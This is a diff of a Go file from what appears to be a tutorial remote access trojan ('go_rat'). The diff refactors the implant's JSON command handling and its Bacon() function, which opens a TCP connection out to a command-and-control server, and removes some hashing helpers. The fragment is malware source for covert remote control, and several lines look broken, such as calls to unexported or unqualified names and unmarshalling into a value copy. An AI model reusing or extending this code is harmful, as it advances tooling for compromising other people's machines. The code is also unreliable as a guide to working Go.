@@ -8,47 +8,36 @@ package target_binary
 // import the libraries we need
 import (
 	"bufio"
-	"crypto"
 	"encoding/json"
 	"fmt"
-	"io"
-	"log"
-	"net"
-	"os"
-	"strings"
+
+	//"go_rat"
+
 	/*/
-	IMPORTING MODULES FROM PARENT DIRECTORY
+	IMPORTING MODULES FROM GOMODCACHE DIRECTORY
 		A useful way to make multiple binaries with common code
 		- depends on the folder structure and module naming
+		- gomodcache is also, invisibly, the pkg directory in the workspace
 
-	/*//*/  IMPORTING MODULES YOU FIND ONLINE
-		in the terminal in VSCODE, while in the package root directory,
-		append the following imports, as is, to the command "go get"
 
-		Example:
-
-		go get github.com/hashicorp/mdns
-
-		And it will install the modules to the
-		GOMODCACHE environment variable
-
-	/*/// for colorized printing
-	// basic ANSI Escape sequences
-	// necessary for multicast DNS
+	/*/
+	"go_rat/pkg/go_rat"
+	"net"
+	"strings"
 )
 
 //
 // This function of for extracting messages sent in json into the
 // Command type
 // This gets placed in a loop to handle net.Conn type
-// containing json
-// AFTER AUTH
-func json_extract(text string, command_struct Command) {
+// containing json AFTER AUTH
+func json_extract(text string, command_struct go_rat.Command) {
 	/*/
 		use Unmarshal if we expect our data to be pure JSON
 		second parameter is the address of the struct
 		we want to store our arsed data in
 	/*/
+	go_rat.error_printer("wat")
 	json.Unmarshal([]byte(text), &command_struct)
 
 }
@@ -56,7 +45,7 @@ func json_extract(text string, command_struct Command) {
 /*/
 Function for packing up a string to send down the wire to the command and control
 /*/
-func json_pack(json_string string, outgoing_message OutgoingMessage) []byte {
+func json_pack(json_string string, outgoing_message go_rat.OutgoingMessage) []byte {
 	encoded_json, err := json.Marshal(json_string)
 	if err != nil {
 		error_printer(err, "[-] Problem with JSON packing function")
@@ -68,7 +57,7 @@ func json_pack(json_string string, outgoing_message OutgoingMessage) []byte {
 // makes requests outside the network to get to the C&C
 // ONLY used for reaching out
 func Bacon() {
-	PHONEHOME_TCP.IP = net.IP(remote_tcpaddr)
+	go_rat.PHONEHOME_TCP.IP = net.IP(remote_tcpaddr)
 	net.DialTCP("tcp", &local_tcpaddr_LAN, &PHONEHOME_TCP)
 }
 
@@ -80,60 +69,7 @@ function to hash a string to compare against the hardcoded password
  For the porpoises of this tutorial, we use a weak password.
 */
 
-func hash_auth_check(password string) {
-	//Various Hashes, in order of increasing security
-	// dont use this
-	md5_password_hash := crypto.MD5.New()
-	md5_password_hash.Sum([]byte(password))
-	// or this
-	sha1_password_hash := crypto.MD5SHA1.New()
-	sha1_password_hash.Sum([]byte(password))
-	// this is ok-ish, if you have a long password
-	sha256_password_hash := crypto.SHA512_256.New()
-	sha256_password_hash.Sum([]byte(password))
-}
-
-// the obvious, a plaintext password, hardcoded
-func insecure_password_check(password string) {
-
-}
-
-/*/
-function to get the hash of a file for integrity checking
-	create hash instance
-		- this is a memory address we are going to shove a file into
-	read the file from path
-		- handle error if necessary
-		- generic error printing
-/*/
-func file_hash(path string) []byte {
-	file_hash := crypto.SHA256.New()
-	file_input, err := os.Open(path)
-	if err != nil {
-		// print the error
-		fmt.Println(err)
-	}
-	// defer the closing of our File so that we can parse it later on
-	defer file_input.Close()
-
-	/*/
-	     copy file buffer to hash compute buffer
-		 the underscore character "_" is called a "blank identifier"
-		 it allows you to ignore return values
-		 in this case, we are acting like the regular return value
-		 doesnt exist and if there is an error, log that error and exit
-		 otherwise, finish copying from buffer to buffer
-	    /*/
-	if _, error := io.Copy(file_hash, file_input); error != nil {
-		log.Fatal(error)
-	}
-	// and compute the hash of the file you provided to this function
-	//file_hash_sha256 := file_hash.Sum(nil)
-	return file_hash.Sum(nil)
-
-}
-
-var new_command_for_q Command
+var new_command_for_q go_rat.Command
 
 // function to provide outbound connections via threading
 //-----------------Local IP---------Remote IP---------PORT-------
